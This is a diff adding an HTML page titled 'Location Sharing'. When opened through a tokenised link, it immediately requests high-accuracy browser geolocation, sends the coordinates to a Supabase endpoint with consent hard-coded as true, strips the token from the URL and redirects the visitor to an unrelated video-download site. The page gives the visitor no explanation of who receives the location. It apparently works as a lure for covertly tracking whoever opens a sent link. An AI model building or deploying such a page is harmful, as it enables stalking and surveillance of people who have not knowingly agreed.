@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#2c4054">
+  <title>Location Sharing</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #f3f6f8;
+      color: #2c4054;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .topbar {
+      min-height: 64px;
+      padding: 0 max(7%, calc((100% - 1160px) / 2));
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 18px;
+      background: #2c4054;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      white-space: nowrap;
+      font-size: 22px;
+    }
+    .brand-icon {
+      width: 38px;
+      height: 38px;
+      display: grid;
+      place-items: center;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #00c99a, #00a7bd);
+      color: white;
+      font-size: 25px;
+    }
+    .top-note { color: #d9e3eb; font-size: 14px; }
+    main {
+      width: min(92%, 920px);
+      margin: 46px auto 70px;
+      text-align: center;
+    }
+    .hero-logo {
+      width: 66px;
+      height: 66px;
+      margin: 0 auto 12px;
+      display: grid;
+      place-items: center;
+      border-radius: 17px;
+      background: linear-gradient(135deg, #00c99a, #00a7bd);
+      color: #fff;
+      font-size: 36px;
+      box-shadow: 0 5px 14px rgba(0, 169, 157, .18);
+    }
+    h1 {
+      margin: 0 0 7px;
+      color: #2c4054;
+      font-size: clamp(27px, 5vw, 35px);
+    }
+    .subtitle {
+      margin: 0 0 32px;
+      color: #9aa9b6;
+      font-size: 15px;
+    }
+    .share-panel {
+      max-width: 760px;
+      margin: 0 auto;
+      overflow: hidden;
+      border: 1px solid #d9e1e8;
+      border-radius: 6px;
+      background: #fff;
+      text-align: left;
+      box-shadow: 0 3px 12px rgba(36, 55, 73, .04);
+    }
+    .panel-content { padding: 18px 28px; }
+    .notice {
+      margin: 0;
+      color: #718191;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+    #status {
+      min-height: 20px;
+      margin: 10px 0 0;
+      color: #526477;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+    @media (max-width: 520px) {
+      .topbar { padding: 0 18px; }
+      .top-note { display: none; }
+      main { margin-top: 38px; }
+      .panel-content { padding: 16px 19px; }
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">
+      <span class="brand-icon" aria-hidden="true">⌖</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="hero-logo" aria-hidden="true">⌖</div>
+
+    <section class="share-panel" aria-label="Location permission">
+      <div class="panel-content">
+        <p id="status" role="status" aria-live="polite"></p>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    "use strict";
+
+    const SUPABASE_URL = "https://uzykphfpnzcqpucrnanb.supabase.co";
+    const SUPABASE_PUBLISHABLE_KEY =
+      "sb_publishable_c3dkueuOAUh9Elk07iWDgQ_X2p3I0Ea";
+
+    const statusBox = document.getElementById("status");
+    const token = new URLSearchParams(location.search).get("token");
+
+    function status(message) {
+      statusBox.textContent = message;
+    }
+
+    async function sendLocation(position) {
+      status("Sending your location…");
+
+      try {
+        const response = await fetch(
+          SUPABASE_URL + "/functions/v1/submit-report",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "apikey": SUPABASE_PUBLISHABLE_KEY
+            },
+            body: JSON.stringify({
+              token,
+              consent: true,
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            })
+          }
+        );
+
+        const result = await response.json().catch(() => ({}));
+        if (!response.ok || result.success !== true) {
+          throw new Error(result.error || "Location could not be sent.");
+        }
+
+        status("Location shared successfully.");
+        const cleanUrl = new URL(location.href);
+        cleanUrl.searchParams.delete("token");
+        history.replaceState({}, "", cleanUrl);
+
+        // Redirect only after the server confirms the location was received.
+        window.location.replace("https://fdown.net/");
+      } catch (error) {
+        status(error.message || "Unable to send location. Please try again.");
+      }
+    }
+
+    function requestLocation() {
+      if (!token) {
+        return;
+      }
+      if (!window.isSecureContext) {
+        status("Please open this page using its secure HTTPS link.");
+        return;
+      }
+      if (!navigator.geolocation) {
+        status("Location is not supported by this browser.");
+        return;
+      }
+
+      status("Waiting for your browser's location permission…");
+
+      navigator.geolocation.getCurrentPosition(
+        sendLocation,
+        error => {
+          if (error.code === 1) {
+            status("Permission denied. No location was sent.");
+          } else if (error.code === 2) {
+            status("Location unavailable. Check your device's location setting.");
+          } else if (error.code === 3) {
+            status("Location request timed out. Please try again.");
+          } else {
+            status("Could not access location. No location was sent.");
+          }
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 20000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    // Ask for browser location permission as soon as the invite page opens.
+    // The browser controls the permission prompt; this page cannot force it to reappear
+    // if the visitor has already granted or denied permission for this site.
+    if (token) {
+      window.addEventListener("load", requestLocation, { once: true });
+    }
+  </script>
+</body>
+</html>
